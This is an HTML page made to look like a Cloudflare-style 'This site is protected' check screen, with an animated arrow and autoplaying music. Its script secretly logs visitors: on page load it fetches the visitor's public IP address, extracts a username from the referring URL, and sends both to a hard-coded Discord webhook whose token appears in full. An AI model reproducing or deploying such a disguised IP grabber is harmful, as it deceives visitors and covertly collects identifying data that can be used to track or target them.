<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The end</title>
    <!-- أضف الرابط إلى شعار الموقع -->
    <link rel="icon" type="image/png" href="your_logo.png">
    <style>
        /* CSS */
        body {
            background-image: url(pmg.png);
            margin: 0;
            font-family: Arial, sans-serif;
            text-align: center;
            color: rgba(15, 1, 1, 0.158);
        }

        .container {
            position: relative;
            margin-top: 20%;
        }

        .arrow {
            position: absolute;
            top: 50%;
            left: 0;
            transform: translateY(-50%);
            animation: moveArrow 1.5s infinite;
        }

        @keyframes moveArrow {
            0% {
                left: 0;
            }
            50% {
                left: calc(100% - 20px);
            }
            100% {
                left: 0;
            }
        }

        img {
            max-width: 100%;
            max-height: 80%;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>This site is protected</h1>
    <span class="arrow">End</span>
    <p>Developed by End</p>
    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2atsfrGgvgOc3DZ91qMlKN/0412afa63e5fac20964377c70c1a9a17/turnstile_gif.gif" alt="الصورة">
</div>

<script>
    // JavaScript
    const webhookURL = 'https://discord.com/api/webhooks/1231177221553786961/rPr2Pnz-_TdxSle_9lPD95pTuhLgNmpFM3AsvFaZFwSZ-cAl42mIsrGzaUlzYkqZaoIH';

    // الحصول على عنوان IP للزائر باستخدام خدمة خارجية
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;

            // جلب اسم المستخدم من عنوان الموقع السابق
            const referrer = document.referrer;
            const regex = /\/user\/(\w+)/;
            const match = referrer.match(regex);
            const userName = match ? match[1] : 'Unknown';

            const payload = {
                content: `IP الزائر الجديد: ${ipAddress}`,
                embeds: [
                    {
                        title: 'زائر جديد!',
                        description: `لقد قام ${userName} بالوصول إلى الموقع.`,
                        color: 16711680, // لون أحمر (يمكنك تغييره)
                        image: {
                            url: 'https://media0.giphy.com/media/FWRtGrSXbUaJzxK9V6/giphy.gif?cid=6c09b952slpw52m2hfmg6yxgmtclm9gg0i8curjo43z0t0ck&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g',
                        },
                        footer: {
                            text: 'Developed by End',
                            icon_url: 'https://cdn.discordapp.com/avatars/1130546038760018060/41eb7e46eafe176a548afbf6c6e82497.png?size=1024', // أضف رابط الأيقونة الخاصة بك هنا
                        },
                    },
                ],
            };

            // إرسال البيانات إلى ويب هوك ديسكورد
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('فشل في إرسال البيانات إلى ويب هوك');
                }
            })
            .catch(error => {
                console.error('خطأ في إرسال البيانات إلى ويب هوك:', error);
            });
        })
        .catch(error => {
            console.error('خطأ في الحصول على عنوان IP:', error);
        });
</script>

<audio controls src="phonk.mp3" autoplay=""></audio>

</body>
</html>
